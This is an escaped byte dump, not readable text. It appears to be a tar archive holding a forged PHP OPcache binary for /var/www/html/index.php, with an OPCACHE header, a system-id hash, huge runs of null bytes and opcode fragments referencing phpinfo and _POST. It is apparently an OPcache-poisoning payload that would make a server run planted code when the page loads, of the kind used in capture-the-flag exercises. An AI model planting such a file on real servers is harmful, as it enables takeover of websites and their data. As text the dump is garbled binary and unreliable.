x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000666\\x000000000\\x000000000\\x0000000001700\\x0014510444150\\x00017165\\x00 0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00OPCACHE\\x00214510e772fba140ea7a33a277f2799ep\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\xf9 e\\x00\\x00\\x00\\x00\\x07]1\\xcd \\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00badm\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00ibu.\\xb0\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80F\\&quot;e\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00#olh\\x99F\\&quot;e\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xb2$\\x83\\xaf\\xdd\\xaa\\xdf\\x8c\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00/var/www/html/index.php\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\&quot;@\\xb0\\xc5\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xf9\\xe0\\xf8\\xab\\xb5\\xd0\\x00\\x80\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00phpinfo\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00jQ\\xe3\\x0e1\\x00\\x00\\x80\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00_POST\\x00\\x00\\x00E\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00=\\x00\\x01\\x00\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x81\\x00\\x00\\x007\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xff\\xff\\xff\\xff`\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00P\\x01\\x00\\x02A\\x06\\x00\\x00\\x00\\x00\\x00\\x00`\\x00\\x00\\x00\\x02\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00Q\\x02\\x01\\x02\\xf1\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00I\\x02\\x00\\x00F\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x03\\x00\\x00\\x00&gt;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00